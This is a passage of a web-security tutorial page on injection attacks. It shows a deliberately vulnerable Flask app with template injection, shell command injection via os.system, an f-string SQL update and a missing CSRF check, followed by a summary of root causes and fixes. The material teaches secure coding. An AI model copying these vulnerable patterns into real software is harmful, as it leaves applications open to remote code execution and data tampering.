<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/preview&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">preview</span><span class="p">():</span>
    <span class="n">template</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;template&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;p&gt;Hello&lt;/p&gt;&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/export&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">export</span><span class="p">():</span>
    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s1">&#39;data.csv&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;cp uploads/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1"> /tmp/export_</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="s2">&quot;Exported&quot;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/profile&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">update_profile</span><span class="p">():</span>
    <span class="c1"># No CSRF token check</span>
    <span class="n">bio</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;bio&#39;</span><span class="p">]</span>
    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;app.db&#39;</span><span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;UPDATE users SET bio = &#39;</span><span class="si">{</span><span class="n">bio</span><span class="si">}</span><span class="s2">&#39; WHERE id = </span><span class="si">{</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="s2">&quot;Updated&quot;</span>
</code></pre></div>

<hr />
<h2 id="11-summary">11. Summary<a class="header-link" href="#11-summary" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">          </span><span class="n">Injection</span><span class="w"> </span><span class="n">Attacks</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">Prevention</span><span class="w"> </span><span class="n">Summary</span><span class="w">                 </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">SQL</span><span class="w"> </span><span class="n">Injection</span><span class="p">:</span><span class="w">                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Root</span><span class="w"> </span><span class="n">cause</span><span class="p">:</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">concatenation</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">queries</span><span class="w">                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Fix</span><span class="p">:</span><span class="w"> </span><span class="n">Parameterized</span><span class="w"> </span><span class="n">queries</span><span class="p">,</span><span class="w"> </span><span class="n">ORM</span><span class="w">                              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Remember</span><span class="p">:</span><span class="w"> </span><span class="n">Even</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">YOUR</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">needs</span><span class="w"> </span><span class="n">parameterization</span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">XSS</span><span class="w"> </span><span class="p">(</span><span class="n">Cross</span><span class="o">-</span><span class="n">Site</span><span class="w"> </span><span class="n">Scripting</span><span class="p">):</span><span class="w">                                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Root</span><span class="w"> </span><span class="n">cause</span><span class="p">:</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">rendered</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">HTML</span><span class="w"> </span><span class="n">without</span><span class="w"> </span><span class="n">encoding</span><span class="w">     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Fix</span><span class="p">:</span><span class="w"> </span><span class="n">Context</span><span class="o">-</span><span class="n">specific</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="n">encoding</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">CSP</span><span class="w">                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Use</span><span class="w"> </span><span class="n">textContent</span><span class="w"> </span><span class="p">(</span><span class="ow">not</span><span class="w"> </span><span class="n">innerHTML</span><span class="p">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">DOM</span><span class="w"> </span><span class="n">manipulation</span><span class="w">          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Jinja2</span><span class="w"> </span><span class="n">auto</span><span class="o">-</span><span class="n">escaping</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">never</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="o">|</span><span class="n">safe</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">input</span><span class="w">      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">CSRF</span><span class="p">:</span><span class="w">                                                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Root</span><span class="w"> </span><span class="n">cause</span><span class="p">:</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">verification</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">came</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">site</span><span class="w">  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Fix</span><span class="p">:</span><span class="w"> </span><span class="n">CSRF</span><span class="w"> </span><span class="n">tokens</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">SameSite</span><span class="w"> </span><span class="n">cookies</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Origin</span><span class="w"> </span><span class="n">checking</span><span class="w">       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Every</span><span class="w"> </span><span class="n">state</span><span class="o">-</span><span class="n">changing</span><span class="w"> </span><span class="n">endpoint</span><span class="w"> </span><span class="n">needs</span><span class="w"> </span><span class="n">protection</span><span class="w">               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Command</span><span class="w"> </span><span class="n">Injection</span><span class="p">:</span><span class="w">                                              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Root</span><span class="w"> </span><span class="n">cause</span><span class="p">:</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">commands</span><span class="w">                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Fix</span><span class="p">:</span><span class="w"> </span><span class="n">Python</span><span class="w"> </span><span class="n">libraries</span><span class="w"> </span><span class="p">(</span><span class="n">avoid</span><span class="w"> </span><span class="n">shell</span><span class="p">),</span><span class="w"> </span><span class="n">subprocess</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">lists</span><span class="w">   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Never</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">shell</span><span class="o">=</span><span class="n">True</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">input</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">LDAP</span><span class="w"> </span><span class="n">Injection</span><span class="p">:</span><span class="w">                                                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Root</span><span class="w"> </span><span class="n">cause</span><span class="p">:</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">concatenation</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">LDAP</span><span class="w"> </span><span class="n">filters</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Fix</span><span class="p">:</span><span class="w"> </span><span class="n">Escape</span><span class="w"> </span><span class="n">special</span><span class="w"> </span><span class="n">characters</span><span class="p">,</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">LDAP</span><span class="w"> </span><span class="n">bind</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">auth</span><span class="w">      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">SSTI</span><span class="p">:</span><span class="w">                                                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Root</span><span class="w"> </span><span class="n">cause</span><span class="p">:</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">IN</span><span class="w"> </span><span class="n">template</span><span class="p">,</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="n">data</span><span class="w">     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Fix</span><span class="p">:</span><span class="w"> </span><span class="n">Pass</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="n">variables</span><span class="p">,</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">template</span><span class="w">  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Never</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">render_template_string</span><span class="p">(</span><span class="n">f</span><span class="s2">&quot;...{user_input}...&quot;</span><span class="p">)</span><span class="w">      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Defense</span><span class="o">-</span><span class="ow">in</span><span class="o">-</span><span class="n">Depth</span><span class="p">:</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Input</span><span class="w"> </span><span class="n">Validation</span><span class="w"> </span><span class="err">â†’</span><span class="w"> </span><span class="n">Parameterization</span><span class="w"> </span><span class="err">â†’</span><span class="w"> </span><span class="n">Output</span><span class="w"> </span><span class="n">Encoding</span><span class="w"> </span><span class="err">â†’</span><span class="w"> </span><span class="n">CSP</span><span class="w">   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">All</span><span class="w"> </span><span class="n">four</span><span class="w"> </span><span class="n">layers</span><span class="o">.</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">exceptions</span><span class="o">.</span><span class="w">                                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<p><strong>Previous</strong>: <a href="07_OWASP_Top10.md">07. OWASP Top 10 (2021)</a> | <strong>Next</strong>: <a href="./09_Web_Security_Headers.md">09. Web Security Headers and CSP</a></p>
    </div>

    
<div class="lesson-toolbar lesson-toolbar--bottom">
    <div class="toolbar-nav toolbar-nav--prev">
        
        <a href="/study/en/Security/07_OWASP_Top10.html" class="nav-prev">
            <span class="nav-label">Previous</span>
            <span class="nav-title">07. OWASP Top 10 (2021)</span>
        </a>
        
    </div>
    <div class="toolbar-actions">
        <button class="btn btn-copy-link" data-action="copy-link" title="Copy link">
            <span class="icon">ğŸ”—</span>
            <span class="text">Copy link</span>
        </button>
        <a href="/study/en/Security/" class="btn btn-topic-link" title="Back to topic list">
            <span class="icon">ğŸ“‹</span>
            <span class="text">Topic list</span>
        </a>
    </div>
    <div class="toolbar-nav toolbar-nav--next">
        
        <a href="/study/en/Security/09_Web_Security_Headers.html" class="nav-next">
            <span class="nav-label">Next</span>
            <span class="nav-title">Web Security Headers and CSP</span>
        </a>
        
    </div>
</div>


    <div class="toolbar-keyboard-hint">
        <kbd>&larr;</kbd> <kbd>&rarr;</kbd> to navigate between lessons
    </div>
</article>

<!-- Scroll to top floating button -->
<button class="scroll-to-top" id="scroll-to-top" title="Scroll to top" aria-label="Scroll to top">â†‘</button>

            </div>
        </main>
    </div>

    <script src="/study/static/js/app.js"></script>
    <script>
        function switchLanguage(newLang) {
            const path = window.location.pathname;
            const base = '/study';
            const currentLang = 'en';
            const newPath = path.replace(base + '/' + currentLang + '/', base + '/' + newLang + '/');
            window.location.href = newPath + window.location.search;
        }
    </script>
    
<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Copy link - independent feedback per button
        document.querySelectorAll('[data-action="copy-link"]').forEach(function(btn) {
            btn.addEventListener('click', function() {
                navigator.clipboard.writeText(window.location.href);
                var textEl = this.querySelector('.text');
                var originalText = textEl.textContent;
                textEl.textContent = 'Copied!';
                setTimeout(function() { textEl.textContent = originalText; }, 2000);
            });
        });

        // Add copy buttons to code blocks
        document.querySelectorAll('.lesson-content pre').forEach(function(pre) {
            var copyBtn = document.createElement('button');
            copyBtn.className = 'code-copy-btn';
            copyBtn.textContent = 'Copy';
            copyBtn.addEventListener('click', function() {
                var code = pre.querySelector('code');
                var text = code ? code.textContent : pre.textContent;
                navigator.clipboard.writeText(text);
                copyBtn.textContent = 'Copied!';
                setTimeout(function() { copyBtn.textContent = 'Copy'; }, 2000);
            });
            pre.style.position = 'relative';
            pre.appendChild(copyBtn);
        });

        // Scroll to top button
        var scrollBtn = document.getElementById('scroll-to-top');
        window.addEventListener('scroll', function() {
            scrollBtn.classList.toggle('visible', window.scrollY > 300);
        });
        scrollBtn.addEventListener('click', function() {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });

        // Keyboard shortcuts: left/right arrows for lesson navigation
        document.addEventListener('keydown', function(e) {
            var tag = document.activeElement.tagName;
            if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return;

            if (e.key === 'ArrowLeft') {
                var prevLink = document.querySelector('.nav-prev');
                if (prevLink) prevLink.click();
            } else if (e.key === 'ArrowRight') {
                var nextLink = document.querySelector('.nav-next');
                if (nextLink) nextLink.click();
            }
        });
    });
</script>

</body>
</html>
{% endraw %}